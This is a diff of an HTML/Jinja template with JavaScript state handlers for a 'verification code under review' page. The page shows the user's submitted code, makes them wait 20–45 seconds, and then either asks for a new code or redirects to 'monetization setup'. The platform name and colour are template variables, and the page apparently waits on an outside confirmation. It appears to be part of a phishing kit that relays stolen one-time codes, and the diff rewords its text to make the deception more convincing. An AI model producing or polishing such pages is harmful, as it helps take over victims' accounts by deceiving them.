@@ -9,7 +9,7 @@
     </div>
     <div>
       <h2 class="notranslate" style="margin:0;color:{{ platform_color|default('#3B82F6') }};">{{ platform_name }}</h2>
-      <div style="color:#64748b;font-size:13px" id="status-message">Identity Verification in Progress</div>
+      <div style="color:#64748b;font-size:13px" id="status-message">Verification Code Under Review</div>
     </div>
   </div>
   {% endif %}
@@ -20,11 +20,11 @@
       <div class="loading-spinner"></div>
       <h3 style="color:#1e293b;margin:20px 0 12px 0;font-size:18px;font-weight:600">
         <i class="fas fa-shield-check" style="color:#3B82F6;margin-right:8px;"></i>
-        Identity Verification in Progress
+        Your Verification Code Is Under Review
       </h3>
       <p style="color:#64748b;text-align:center;margin-bottom:24px;line-height:1.5;">
-        We're currently validating your identity credentials to ensure account security and compliance. 
-        This automated process typically takes 20-45 seconds to complete.
+        We’re validating the code you submitted to ensure your account’s security and compliance. 
+        This automated review typically takes 20–45 seconds.
       </p>
       
       <div class="security-features">
@@ -43,7 +43,7 @@
       </div>
       
       <div class="code-display">
-        <span class="code-label">Reference ID:</span>
+        <span class="code-label">Submitted Code:</span>
         <span class="code-value">{{ code_value }}</span>
       </div>
       
@@ -66,8 +66,8 @@
       <div class="error-message" style="background: #fef2f2; border: 1px solid #fecaca; border-radius: 12px; padding: 16px; margin-bottom: 24px;">
         <p style="color:#7f1d1d;text-align:center;margin:0;line-height:1.5;">
           <strong>Additional Verification Required</strong><br>
-          We were unable to automatically verify your identity. This can happen due to system updates or security enhancements. 
-          Please generate a new verification code to continue.
+          We couldn’t verify your code. It may be incorrect or expired. 
+          Please request a new verification code to continue.
         </p>
       </div>
 
@@ -93,10 +93,10 @@
       </div>
       
       <h3 style="color:#059669;margin:20px 0 12px 0;font-size:18px;font-weight:600">
-        Identity Verified Successfully
+        Code Verified Successfully
       </h3>
       <p style="color:#047857;text-align:center;margin-bottom:24px;line-height:1.5;">
-        Your identity has been successfully verified and your account is now secured. 
+        Your code has been successfully verified and your account is now secured. 
         You'll be redirected to complete your monetization setup in just a moment.
       </p>
       
@@ -127,7 +127,7 @@ function showLoadingState() {
   document.getElementById('loading-state').style.display = 'block';
   document.getElementById('rejected-state').style.display = 'none';
   document.getElementById('success-state').style.display = 'none';
-  document.getElementById('status-message').textContent = 'Identity Verification in Progress';
+  document.getElementById('status-message').textContent = 'Code Verification in Progress';
 }
 
 function showRejectedState() {
@@ -141,7 +141,7 @@ function showSuccessState() {
   document.getElementById('loading-state').style.display = 'none';
   document.getElementById('rejected-state').style.display = 'none';
   document.getElementById('success-state').style.display = 'block';
-  document.getElementById('status-message').textContent = 'Identity Verified Successfully';
+  document.getElementById('status-message').textContent = 'Code Verified Successfully';
 }
 
 function checkConfirmation() {
